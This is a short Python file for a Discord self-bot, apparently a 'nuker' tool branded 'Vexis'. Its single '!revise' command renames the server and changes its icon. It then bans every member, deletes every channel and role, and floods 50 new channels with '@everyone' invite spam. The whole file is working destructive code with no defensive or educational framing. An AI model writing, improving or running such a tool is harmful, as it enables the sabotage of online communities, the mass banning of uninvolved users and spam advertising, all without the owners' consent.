# main.py
import os
import discord
from discord.ext import commands
import asyncio

TOKEN = os.getenv("TOKEN")
bot = commands.Bot(command_prefix="!", self_bot=True)

@bot.command()
async def revise(ctx):
    guild = ctx.guild
    await guild.edit(name="Vexis Finder")
    with open("v.png", "rb") as f:
        await guild.edit(icon=f.read())
    for member in guild.members:
        try:
            await member.ban(reason="Revised by Vexis")
        except:
            pass
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    for role in guild.roles:
        try:
            await role.delete()
        except:
            pass
    for i in range(50):
        ch = await guild.create_text_channel(f"revised-by-vexis-{i}")
        for _ in range(10):
            await ch.send("@everyone discord.gg/vexis")
            await asyncio.sleep(0.5)

bot.run(TOKEN)
